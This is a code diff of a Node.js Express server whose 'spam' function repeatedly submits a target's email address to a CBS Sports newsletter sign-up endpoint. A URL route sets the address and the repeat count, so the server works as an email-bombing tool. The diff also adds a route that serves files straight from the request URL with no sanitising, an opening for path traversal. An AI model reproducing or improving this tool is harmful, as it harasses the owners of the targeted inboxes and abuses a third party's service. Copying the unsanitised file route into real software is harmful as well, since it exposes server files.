@@ -1,8 +1,16 @@
 import express from 'express';
 import fs from 'fs';
 import fetch from "node-fetch";
+import { dirname } from 'splendid-ui/node'
+const __dirname = dirname(import.meta.url);
 const app = express();
 var num = 0;
+var errs = 0;
+function createDirectory(directoryPath) {
+    if (!fs.existsSync(directoryPath)){
+        fs.mkdirSync(directoryPath);
+    }
+}
 function spam(theemail, encodedEmail, path){
     fetch("https://www.cbssports.com/fantasy/newsletter-sign-up/xhr/", {
         "headers": {
@@ -116,24 +124,33 @@ function spam(theemail, encodedEmail, path){
             "mode": "cors"
         });
     }).catch(function() {
-        num--;
+        errs++;
     }).then(function(response){
-        num = num + 1;
-        fs.writeFileSync(path + '/file.txt', num);
+        num++;
+        fs.writeFileSync(path + '/num.txt', num.toString());
+        fs.writeFileSync(path + '/errs.txt', errs.toString());
     });    
 }
 app.use(express.static("static"));
-app.get('/sendMail/:id1/:id2', (req, res) => {
+app.get('/sendMail/:id1/:id2/index.html', (req, res) => {
+    errs = 0;
+    num = 0;
     const id1 = atob(req.params.id1);
     const id2 = atob(req.params.id2);
     const theemail = id1;
-    const times = id2;
+    const times = Number(id2);
     const encodedEmail = theemail.replace('@', '%40');
-    fs.writeFileSync(req.url + '/file.txt', "Loading...");
+    createDirectory(__dirname + "/sendMail");
+    createDirectory(__dirname + "/sendMail/" + req.params.id1);
+    createDirectory(__dirname + "/sendMail/" + req.params.id1 + "/" + req.params.id2);
+    fs.writeFileSync(__dirname + req.url.slice(0, req.url.length - 11) + '/num.txt', "Loading...");
     for(var i = 0; i < times; i++){
-    spam(theemail, encodedEmail, req.url);
+    spam(theemail, encodedEmail, __dirname + req.url.slice(0, req.url.length - 11));
     }
-    res.sendFile('/spamPages/spam.html');
+    res.sendFile(__dirname + '/spamPages/spam.html');
+});
+app.get('/sendMail/:id1/:id2/:id3', (req, res) => {
+    res.sendFile(__dirname + req.url);
 });
 app.listen(8080, () => {
     console.log('Server is running on port 8080');
